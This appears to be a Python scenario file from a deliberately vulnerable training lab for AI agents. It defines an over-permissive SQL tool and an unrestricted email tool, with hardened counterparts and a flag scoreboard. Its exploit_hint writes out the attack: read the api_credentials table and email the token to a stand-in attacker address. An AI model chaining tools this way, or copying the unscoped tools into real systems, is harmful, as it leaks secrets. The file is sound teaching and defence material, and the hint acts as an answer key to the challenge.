"""ASI02 — Tool Misuse & Exploitation.

A customer-support agent is given a database tool and an email tool. Both are
over-scoped: the DB tool runs arbitrary SQL (it only needs the FAQ), and email
can reach any recipient. Chaining them exfiltrates secrets — the classic
"read sensitive data with tool A, send it out with tool B" pivot.

INSECURE: query_database runs arbitrary SQL on every table; send_email reaches
any address.

HARDENED: query_database is read-only and restricted to an allowlist of public
tables; send_email is limited to internal recipients.
"""

from __future__ import annotations

from ..sandbox import Sandbox
from .base import ScenarioMeta

META = ScenarioMeta(
    id="ASI02",
    name="Tool Misuse & Exploitation",
    summary=(
        "Over-scoped tools (arbitrary SQL + unrestricted email) are chained to "
        "read sensitive rows and exfiltrate them."
    ),
    exploit_hint=(
        "query_database(\"SELECT * FROM api_credentials\") to read the loot token, "
        "then send_email('attacker@evil.example', 'x', <token>) — or exfiltrate(...)."
    ),
    hardened_behavior=(
        "DB tool is read-only + table-allowlisted; email is restricted to internal "
        "recipients."
    ),
)

_INTERNAL_EMAIL_SUFFIX = "@example.internal"


def register(mcp, sandbox: Sandbox) -> None:
    config = sandbox.config

    @mcp.tool()
    def query_database(sql: str) -> list[dict]:
        """Query the support database to answer customer questions."""
        if config.is_hardened():
            # Reference fix: ignore arbitrary SQL; expose only scoped reads.
            raise PermissionError(
                "arbitrary SQL is disabled. Use query_faq() — only the public_faq "
                "table is readable in hardened mode."
            )
        return sandbox.db.execute_raw(sql)

    @mcp.tool()
    def query_faq() -> list[dict]:
        """Read the public FAQ table (the only data a support agent needs)."""
        return sandbox.db.query_scoped("public_faq")

    @mcp.tool()
    def send_email(to: str, subject: str, body: str) -> str:
        """Send an email on behalf of the support desk."""
        if config.is_hardened() and not to.endswith(_INTERNAL_EMAIL_SUFFIX):
            return (
                f"[blocked] recipient {to!r} is external; hardened policy permits "
                f"only {_INTERNAL_EMAIL_SUFFIX} addresses."
            )
        if config.is_insecure():
            # Exfiltration via email body is credited like the egress sink.
            solved = sandbox.scoreboard.capture(f"{subject}\n{body}")
            if solved:
                return (
                    f"[sent] email to {to!r}.  >>> CAPTURED FLAGS for "
                    f"{', '.join(solved)}! Check the scoreboard."
                )
        return f"[sent] email to {to!r} (subject={subject!r})."
